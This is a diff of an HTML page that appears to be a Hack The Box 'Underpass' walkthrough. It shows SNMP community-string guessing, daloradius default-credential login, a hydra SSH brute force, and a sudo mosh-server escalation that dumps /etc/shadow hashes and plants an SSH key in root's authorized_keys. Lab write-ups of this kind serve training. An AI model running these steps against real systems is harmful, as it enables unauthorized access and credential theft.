+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.5 <span style=color:#f92672>=</span> View-based Access Control Model <span style=color:#66d9ef>for</span> SNMP.
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.6 <span style=color:#f92672>=</span> The MIB module <span style=color:#66d9ef>for</span> managing TCP implementations
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.7 <span style=color:#f92672>=</span> The MIB module <span style=color:#66d9ef>for</span> managing UDP implementations
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.8 <span style=color:#f92672>=</span> The MIB module <span style=color:#66d9ef>for</span> managing IP and ICMP implementations
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.9 <span style=color:#f92672>=</span> The MIB modules <span style=color:#66d9ef>for</span> managing SNMP Notification, plus filtering.
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.10 <span style=color:#f92672>=</span> The MIB module <span style=color:#66d9ef>for</span> logging SNMP Notifications.
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.4.10 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.1.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>452067</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.2.0 <span style=color:#f92672>=</span> é+
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.3.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>393216</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.4.0 <span style=color:#f92672>=</span> BOOT_IMAGE<span style=color:#f92672>=</span>/vmlinuz-5.15.0-126-generic root<span style=color:#f92672>=</span>/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> biosdevname<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.5.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.6.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>217</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.7.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Found valid community string: public
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Trying community string: private
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>Community string private is not valid.
+</span></span><span style=display:flex><span>Trying community string: manager
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>Community string manager is not valid.
+</span></span><span style=display:flex><span>Trying community string: admin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>Community string admin is not valid.
+</span></span><span style=display:flex><span>Trying community string: root
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>Community string root is not valid.
+</span></span><span style=display:flex><span>Trying community string: snmp
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>Community string snmp is not valid.
+</span></span><span style=display:flex><span>Trying community string: snmpwalk
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>Community string snmpwalk is not valid.
+</span></span><span style=display:flex><span>Trying community string: snmpwalk2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>Community string snmpwalk2 is not valid.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>=====</span> Enumerating data <span style=color:#66d9ef>for</span> community string: public <span style=color:#f92672>=====</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- Interfaces <span style=color:#f92672>(</span>1.3.6.1.2.1.2<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>Error: No SNMP response received before timeout
+</span></span><span style=display:flex><span>No results or access denied.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- IP <span style=color:#f92672>(</span>1.3.6.1.2.1.4<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.1.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>457304</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.2.0 <span style=color:#f92672>=</span> é+
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.3.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>393216</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.4.0 <span style=color:#f92672>=</span> BOOT_IMAGE<span style=color:#f92672>=</span>/vmlinuz-5.15.0-126-generic root<span style=color:#f92672>=</span>/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> biosdevname<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.5.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.6.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>217</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.7.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- TCP <span style=color:#f92672>(</span>1.3.6.1.2.1.6<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.1.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>457364</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.2.0 <span style=color:#f92672>=</span> é+
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.3.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>393216</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.4.0 <span style=color:#f92672>=</span> BOOT_IMAGE<span style=color:#f92672>=</span>/vmlinuz-5.15.0-126-generic root<span style=color:#f92672>=</span>/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> biosdevname<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.5.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.6.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>217</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.7.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- UDP <span style=color:#f92672>(</span>1.3.6.1.2.1.7<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.1.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>457436</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.2.0 <span style=color:#f92672>=</span> é+
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.3.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>393216</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.4.0 <span style=color:#f92672>=</span> BOOT_IMAGE<span style=color:#f92672>=</span>/vmlinuz-5.15.0-126-generic root<span style=color:#f92672>=</span>/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> biosdevname<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.5.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.6.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>217</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.7.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- Host Resources <span style=color:#f92672>(</span>1.3.6.1.2.1.25.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.1.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>457691</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.2.0 <span style=color:#f92672>=</span> é+
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.3.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>393216</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.4.0 <span style=color:#f92672>=</span> BOOT_IMAGE<span style=color:#f92672>=</span>/vmlinuz-5.15.0-126-generic root<span style=color:#f92672>=</span>/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> biosdevname<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.5.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.6.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>217</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.25.1.7.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>Interesting - we now have a username: <code>steve</code>. We also know there is a <a href=https://www.daloradius.com/>daloradius</a> server running.</p><p><code>http://underpass.htb/daloradius/</code> returns a 403, but now we have a new directory to enumerate. Checking out our findings from a quick scan from dirsearch, <code>http://underpass.htb/daloradius/ChangeLog</code> gives us a version number - 1.1-3.</p><p><code>http://underpass.htb/daloradius/.gitignore</code> gives us some interesting file paths:</p><pre tabindex=0><code>.idea/
 *.log
 *.db
 invoice_preview.html
@@ -389,7 +389,7 @@ var/log/*.log
 var/backup/*.sql
 app/common/includes/daloradius.conf.php
 app/common/library/htmlpurifier/HTMLPurifier/DefinitionCache/Serializer/HTML/*
-</code></pre><p>At <code>http://underpass.htb/daloradius/docker-compose.yml</code> we strike gold:</p><pre tabindex=0><code>version: &#34;3&#34;
+</code></pre><p>At <code>http://underpass.htb/daloradius/docker-compose.yml</code> we potentially strike gold:</p><pre tabindex=0><code>version: &#34;3&#34;
 
 services:
 
@@ -455,151 +455,151 @@ services:
 
     volumes:
       - ./data/daloradius:/data
-</code></pre><p>We also find a login page at <code>http://underpass.htb/daloradius/app/users/login.php</code>. With some searching we can find that the default creds for daloradius are <code>administrator:radius</code> but these don&rsquo;t seem to work.</p><p>However, after firing up a local instance of this and poking around, I found that there is a separate login page for admin users: <code>http://underpass.htb/daloradius/app/operators/login.php</code>. The default credentials work here!</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/underpass-admin-page.png alt="Underpass admin page" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>In the config section of the admin site we find more database creds:</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/db-config.png alt="Database config" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>Even juicer we see a password hash for a user on the Management page:</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/passhash.png alt=Jackpot loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>Using crackstation.net reveals this cracks to <code>underwaterfriends</code>, and trying this with hydra gives us a foothold on the box:</p><pre tabindex=0><code>└─$ hydra -L users -P pass ssh://underpass
-Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-23 17:53:45
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:4/p:5), ~2 tries per task
-[DATA] attacking ssh://underpass:22/
-[22][ssh] host: underpass   login: svcMosh   password: underwaterfriends
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-23 17:53:51
-</code></pre><p>and can now get user.txt</p><pre tabindex=0><code>└─$ ssh svcMosh@underpass
-svcMosh@underpass&#39;s password:
-Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Mon Jun 23 11:56:39 PM UTC 2025
-
-  System load:  0.09              Processes:             232
-  Usage of /:   52.7% of 6.56GB   Users logged in:       0
-  Memory usage: 16%               IPv4 address for eth0: 10.129.231.213
-  Swap usage:   0%
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-Last login: Sat Jan 11 13:27:33 2025 from 10.10.14.62
-svcMosh@underpass:~$ ll
-total 36
-drwxr-x--- 5 svcMosh svcMosh 4096 Jan 11 13:27 ./
-drwxr-xr-x 3 root    root    4096 Dec 11  2024 ../
-lrwxrwxrwx 1 root    root       9 Sep 22  2024 .bash_history -&gt; /dev/null
--rw-r--r-- 1 svcMosh svcMosh  220 Sep  7  2024 .bash_logout
--rw-r--r-- 1 svcMosh svcMosh 3771 Sep  7  2024 .bashrc
-drwx------ 2 svcMosh svcMosh 4096 Dec 11  2024 .cache/
-drwxrwxr-x 3 svcMosh svcMosh 4096 Jan 11 13:27 .local/
--rw-r--r-- 1 svcMosh svcMosh  807 Sep  7  2024 .profile
-drwxr-xr-x 2 svcMosh svcMosh 4096 Dec 11  2024 .ssh/
--rw-r----- 1 root    svcMosh   33 Jun 23 21:49 user.txt
-svcMosh@underpass:~$ cat user.txt
-50df3553e04f627ecxxxxxxxxxxxxxxx
-</code></pre><h3 id=getting-root>Getting Root</h3><p>Doing a first-step enum shows we can run <code>sudo</code>:</p><pre tabindex=0><code>svcMosh@underpass:~$ sudo -l
-Matching Defaults entries for svcMosh on localhost:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
-
-User svcMosh may run the following commands on localhost:
-    (ALL) NOPASSWD: /usr/bin/mosh-server
-</code></pre><p>After a bit of research - mosh-server is intended to sync up with mosh-client. It&rsquo;s intended to be an ssh alternative especially for high latency servers. A quick glance in the man file also tells us that it can be programmed to run a command when triggered.</p><p>In other words, we&rsquo;ve got our privesc path. We can craft a privileged command to run when we connect to the server:</p><pre tabindex=0><code>svcMosh@underpass:~$  sudo /usr/bin/mosh-server new -p 1337 -- sh -c &#39;cat /etc/shadow &gt; /tmp/shadowdump &amp;&amp; chmod 644 /tmp/shadowdump&#39;
-
-
-MOSH CONNECT 1337 j+kvuhgaEXpBr5A3xlVXYQ
-
-mosh-server (mosh 1.3.2) [build mosh 1.3.2]
-Copyright 2012 Keith Winstein &lt;mosh-devel@mit.edu&gt;
-License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.
-
-[mosh-server detached, pid = 4081]
-</code></pre><p>With mosh-client installed on our attacker machine, we can now use the key provided by the server to connect and execute the payload.</p><pre tabindex=0><code>└─$ MOSH_KEY=&#39;j+kvuhgaEXpBr5A3xlVXYQ&#39; mosh-client 10.129.231.213 1337
-[mosh is exiting.]
-</code></pre><p>Checking /tmp:</p><pre tabindex=0><code>svcMosh@underpass:~$ cat /tmp/shadowdump
-root:$y$j9T$y6GVl9yuguP9lhnKmS04c.$pzmkCXRNa/BCrMpnOUxIWUbVR905YSEHwW20O40wEaA:20057:0:99999:7:::
-daemon:*:19103:0:99999:7:::
-bin:*:19103:0:99999:7:::
-sys:*:19103:0:99999:7:::
-sync:*:19103:0:99999:7:::
-games:*:19103:0:99999:7:::
-man:*:19103:0:99999:7:::
-lp:*:19103:0:99999:7:::
-mail:*:19103:0:99999:7:::
-news:*:19103:0:99999:7:::
-uucp:*:19103:0:99999:7:::
-proxy:*:19103:0:99999:7:::
-www-data:*:19103:0:99999:7:::
-backup:*:19103:0:99999:7:::
-list:*:19103:0:99999:7:::
-irc:*:19103:0:99999:7:::
-gnats:*:19103:0:99999:7:::
-nobody:*:19103:0:99999:7:::
-_apt:*:19103:0:99999:7:::
-systemd-network:*:19103:0:99999:7:::
-systemd-resolve:*:19103:0:99999:7:::
-messagebus:*:19103:0:99999:7:::
-systemd-timesync:*:19103:0:99999:7:::
-pollinate:*:19103:0:99999:7:::
-sshd:*:19103:0:99999:7:::
-syslog:*:19103:0:99999:7:::
-uuidd:*:19103:0:99999:7:::
-tcpdump:*:19103:0:99999:7:::
-tss:*:19103:0:99999:7:::
-landscape:*:19103:0:99999:7:::
-usbmux:*:19949:0:99999:7:::
-lxd:!:19949::::::
-fwupd-refresh:*:19959:0:99999:7:::
-freerad:*:19963:0:99999:7:::
-mysql:!:19964:0:99999:7:::
-Debian-snmp:!:19964:0:99999:7:::
-tftp:*:19970:0:99999:7:::
-svcMosh:$y$j9T$cK5jfCW.c6g5yvOzPF5iF1$E0geEsKPdNSCLj2wVbvftMGkbs.uJL7B0ADA41Q8Y08:20067:0:99999:7:::
-_laurel:!:20068::::::
-</code></pre><p>We can now do anything as root. Let&rsquo;s write our ssh key into root&rsquo;s authorized_keys files so we can get SSH access:</p><pre tabindex=0><code>sudo /usr/bin/mosh-server new -p 1337 -- sh -c &#39;mkdir -p /root/.ssh &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBvuBDwumAevSydWICpgT28gq8GgoYklpQ4YqDb54uLs&#34; &gt; /root/.ssh/authorized_keys &amp;&amp; chmod 600 /root/.ssh/authorized_keys &amp;&amp; chmod 700 /root/.ssh&#39;
-</code></pre><p>The permission changes are to make sure that the permissions on the directory and authorized_keys files are adequately protected; otherwise SSH won&rsquo;t use them.</p><p>And we&rsquo;re root:</p><pre tabindex=0><code>└─$ ssh root@underpass
-Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Tue Jun 24 03:06:46 AM UTC 2025
-
-  System load:  0.02              Processes:             228
-  Usage of /:   54.1% of 6.56GB   Users logged in:       1
-  Memory usage: 15%               IPv4 address for eth0: 10.129.231.213
-  Swap usage:   0%
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-Last login: Wed Jan  8 16:29:58 2025
-root@underpass:~# cat /root/root.txt
-4886c9afa327d2714xxxxxxxxxxxxxxx
-root@underpass:~#
-</code></pre><h3 id=closing-the-vulnerability>Closing the Vulnerability</h3><ul><li>When designing software, never include default credentials. Always have the user set their own credentials where possible.</li><li>On systems that do use default credentials, change the password immediately after logging in for the first time.</li><li>Don&rsquo;t display user passwords or password hashes to other users (seriously, daloradius???)</li><li>Be careful about giving users sudo permissions</li></ul><h3 id=key-penetration-testing-takeaways>Key Penetration Testing Takeaways</h3><ul><li>Sometimes, a UDP scan isn&rsquo;t completely useless.</li><li>Enumerate harder.</li><li>Running a local copy of an open source piece of software can be helpful to find exploit paths.</li><li>Sudo is your friend.</li></ul></div></article></div><script src=/lightbox.js></script></body></html>
+</code></pre><p>We also find a login page at <code>http://underpass.htb/daloradius/app/users/login.php</code>. With some searching we can find that the default creds for daloradius are <code>administrator:radius</code> but these don&rsquo;t seem to work.</p><p>However, after firing up a local instance of this and poking around, I found that there is a separate login page for admin users: <code>http://underpass.htb/daloradius/app/operators/login.php</code>. The default credentials work here!</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/underpass-admin-page.png alt="Underpass admin page" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>In the config section of the admin site we find more database creds:</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/db-config.png alt="Database config" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>Even juicer we see a password hash for a user on the Management page:</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/passhash.png alt=Jackpot loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>Using crackstation.net reveals this cracks to <code>underwaterfriends</code>, and trying this with hydra gives us a foothold on the box:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ hydra -L users -P pass ssh://underpass
+</span></span><span style=display:flex><span>Hydra v9.5 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2025-06-23 17:53:45
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>20</span> login tries <span style=color:#f92672>(</span>l:4/p:5<span style=color:#f92672>)</span>, ~2 tries per task
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://underpass:22/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: underpass   login: svcMosh   password: underwaterfriends
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
+</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2025-06-23 17:53:51
+</span></span></code></pre></div><p>and can now get user.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ ssh svcMosh@underpass
+</span></span><span style=display:flex><span>svcMosh@underpass<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
+</span></span><span style=display:flex><span>Welcome to Ubuntu 22.04.5 LTS <span style=color:#f92672>(</span>GNU/Linux 5.15.0-126-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/pro
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> System information as of Mon Jun <span style=color:#ae81ff>23</span> 11:56:39 PM UTC <span style=color:#ae81ff>2025</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:  0.09              Processes:             <span style=color:#ae81ff>232</span>
+</span></span><span style=display:flex><span>  Usage of /:   52.7% of 6.56GB   Users logged in:       <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  Memory usage: 16%               IPv4 address <span style=color:#66d9ef>for</span> eth0: 10.129.231.213
+</span></span><span style=display:flex><span>  Swap usage:   0%
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Expanded Security Maintenance <span style=color:#66d9ef>for</span> Applications is not enabled.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> updates can be applied immediately.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Enable ESM Apps to receive additional future security updates.
+</span></span><span style=display:flex><span>See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The list of available updates is more than a week old.
+</span></span><span style=display:flex><span>To check <span style=color:#66d9ef>for</span> new updates run: sudo apt update
+</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Sat Jan <span style=color:#ae81ff>11</span> 13:27:33 <span style=color:#ae81ff>2025</span> from 10.10.14.62
+</span></span><span style=display:flex><span>svcMosh@underpass:~$ ll
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>36</span>
+</span></span><span style=display:flex><span>drwxr-x--- <span style=color:#ae81ff>5</span> svcMosh svcMosh <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>11</span> 13:27 ./
